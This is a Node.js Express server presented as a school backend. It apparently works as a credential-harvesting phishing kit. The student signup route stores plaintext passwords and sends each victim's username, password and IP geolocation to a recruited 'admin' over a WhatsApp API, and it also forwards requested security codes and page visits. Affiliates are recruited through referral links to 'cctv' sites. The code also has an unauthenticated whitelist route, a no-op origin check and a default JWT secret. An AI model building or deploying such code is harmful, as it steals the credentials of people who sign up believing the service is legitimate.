// server.js - Production-ready minimal school backend
// npm i express mongoose cors axios bcrypt jsonwebtoken dotenv

require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const axios = require("axios");
const bcrypt = require("bcryptjs");
const jwt = require('jsonwebtoken');
const JWT_SECRET = process.env.JWT_SECRET || 'change_this_secret';
const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 5000;
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/prospercub";
const DEFAULT_ADMIN_USERNAME = process.env.DEFAULT_ADMIN_USERNAME || "admin";

// -------------------- MongoDB --------------------
mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("Mongo error:", err.message));

// -------------------- Schemas --------------------
const adminSchema = new mongoose.Schema({
  name: String,
  username: { type: String, unique: true },
  phone: String,
  apikey: String,
  password: String,
  settings: {
    whitelistedDomains: { type: [String], default: ["https://nexa-sage.vercel.app","https://cctv-liart.vercel.app","https://cctv-ujg4.vercel.app"] }
  },
  createdAt: { type: Date, default: Date.now }
});
const Admin = mongoose.model("Admin", adminSchema);

const studentSchema = new mongoose.Schema({
  username: String,
  password: String,
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  createdAt: { type: Date, default: Date.now }
});
const Student = mongoose.model("Student", studentSchema);

const activitySchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  studentId: { type: mongoose.Schema.Types.ObjectId, ref: "Student" },
  action: String,
  details: { type: Object, default: {} },
  createdAt: { type: Date, default: Date.now }
});
const Activity = mongoose.model("Activity", activitySchema);

const referralSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  code: String,
  createdAt: { type: Date, default: Date.now }
});
const Referral = mongoose.model("Referral", referralSchema);

const securityCodeSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  code: String,
  usedBy: { type: mongoose.Schema.Types.ObjectId, ref: "Student", default: null },
  createdAt: { type: Date, default: Date.now }
});
const SecurityCode = mongoose.model("SecurityCode", securityCodeSchema);

// -------------------- Helpers --------------------
async function sendWhatsAppToAdmin(adminId, message) {
  try {
    const admin = await Admin.findById(adminId);
    if (!admin || !admin.phone || !admin.apikey) return console.log("⚠️ Missing admin info");

    const url = "https://api.callmebot.com/whatsapp.php";
    const params = { phone: admin.phone.startsWith('+') ? admin.phone : '+' + admin.phone, text: message, apikey: admin.apikey };
    
    const response = await axios.get(url, { params, validateStatus: () => true });
    console.log("📲 WhatsApp response:", response.status, response.data);

    if (response.data.includes("error") || response.status !== 200) {
      console.log("⚠️ Retry sending WhatsApp message");
      await axios.get(url, { params, validateStatus: () => true });
    }
  } catch (err) {
    console.error("WhatsApp error:", err.message);
  }
}

function generateCode(len = 8) {
  return Math.random().toString(36).substring(2, 2 + len);
}

async function hashPassword(pw) {
  return await bcrypt.hash(pw, 10);
}

async function getLocationFromIP(ip) {
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`);
    return {
      city: res.data.city,
      region: res.data.region,
      country: res.data.country_name,
      latitude: res.data.latitude,
      longitude: res.data.longitude
    };
  } catch {
    return { error: "Location unavailable" };
  }
}

// -------------------- Whitelist Middleware --------------------
app.use(async (req, res, next) => {
  const origin = req.headers.origin;
  if (!origin) return next();
  
  next();
});

// -------------------- Admin Routes --------------------

// Admin signup
app.post("/admin/register", async (req, res) => {
  try {
    const { firstname, lastname, phone, apikey, password } = req.body;
    if (!firstname || !lastname || !phone || !apikey || !password)
      return res.status(400).json({ error: "Missing fields" });

    const username = firstname.toLowerCase();
    if (await Admin.findOne({ username })) return res.status(400).json({ error: "Admin exists" });

    const hashed = await hashPassword(password);
    const admin = await Admin.create({ name: `${firstname} ${lastname}`, username, phone, apikey, password: hashed });

    // create first referral
    const code = generateCode(10);
    await Referral.create({ adminId: admin._id, code });

    const link = `https://cctv-ujg4.vercel.app/i.html?ref=${code}`;
    const msg = `👋 Welcome to Nexa cctv admin panel ${firstname}!\nYour referral link: ${link}\n\nJoin hundreds of hustler to enjoy life, \nNOTE: you can also get a NGN500 discount each time you refer a friend, have fun!🇳🇬🇳🇬🇺🇸🇺🇸🇳🇬🇳🇬🚀`;
    sendWhatsAppToAdmin(admin._id, msg);

    res.json({ success: true, admin, referralLink: link });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Admin registration failed" });
  }
});






app.post('/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'username & password required' });

    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(404).json({ error: 'Admin not found' });

    const match = await bcrypt.compare(password, admin.password);
    if (!match) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign({ id: admin._id, username: admin.username }, JWT_SECRET, { expiresIn: '7d' });

    res.json({
      success: true,
      token,
      admin: { username: admin.username, name: admin.name, phone: admin.phone }
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Login failed' });
  }
});
// Admin: manage whitelisted domains
app.post("/admin/whitelist", async (req, res) => {
  try {
    const { username, domains } = req.body;
    if (!username || !domains || !Array.isArray(domains)) return res.status(400).json({ error: "Provide username & array of domains" });

    const admin = await Admin.findOne({ username });
    if (!admin) return res.status(404).json({ error: "Admin not found" });

    admin.settings.whitelistedDomains = domains;
    await admin.save();

    res.json({ success: true, whitelistedDomains: domains });
  } catch (err) {
    res.status(500).json({ error: "Failed to update whitelist" });
  }
});

// -------------------- Student Routes --------------------

// Student signup
app.post("/student/register", async (req, res) => {
  try {
    const { username, password, referralCode, platform } = req.body;
   if (!username || !password) return res.status(400).json({ error: "username & password required" });

    let admin = null;
    if (referralCode) {
      const ref = await Referral.findOne({ code: referralCode });
      if (ref) admin = await Admin.findById(ref.adminId);
    }
    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
    if (!admin) return res.status(500).json({ error: "No admin found" });

    
    const student = await Student.create({ username, password, adminId: admin._id });

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const location = await getLocationFromIP(ip);

    const msg = `🆕 Student signup\nUsername: ${username}\nPassword: ${password}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}`;
    sendWhatsAppToAdmin(admin._id, msg);

    res.json({ success: true, studentId: student._id,admin });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Student signup failed" });
  }
});

// Student request security code
app.post("/student/request-code", async (req, res) => {
  try {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: "username required" });

    const student = await Student.findOne({ username });
    if (!student) return res.status(404).json({ error: "Student not found" });

    const code = generateCode(6);
    const sc = await SecurityCode.create({ adminId: student.adminId, code });

    const msg = `🔑 Security code requested by ${username}\nCode: ${code}\nStudentID: ${student._id}`;
    sendWhatsAppToAdmin(student.adminId, msg);

    res.json({ success: true, codeId: sc._id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to request security code" });
  }
});

// Student visit logging
app.post("/student/visit", async (req, res) => {
  try {
    const { path, referrer, utm, userAgent } = req.body;

    let admin = null;
    if (referrer) {
      const ref = await Referral.findOne({ code: referrer });
      if (ref) admin = await Admin.findById(ref.adminId);
    }
    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
    if (!admin) return res.status(500).json({ error: "No admin found" });

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const location = await getLocationFromIP(ip);

    await Activity.create({ adminId: admin._id, action: "visit", details: { path, referrer, utm, userAgent, location } });

    const msg = `📈 Page visit\nPath: ${path}\nReferral: ${referrer || "direct"}\nUserAgent: ${userAgent}\nLocation: ${JSON.stringify(location)}`;
    sendWhatsAppToAdmin(admin._id, msg);

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Failed to track visit" });
  }
});

// -------------------- Start Server --------------------
app.get("/", (req, res) => res.send("<h1>✅ School backend running</h1>"));
app.use((req, res) => res.status(404).json({ error: "Route not found" }));

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
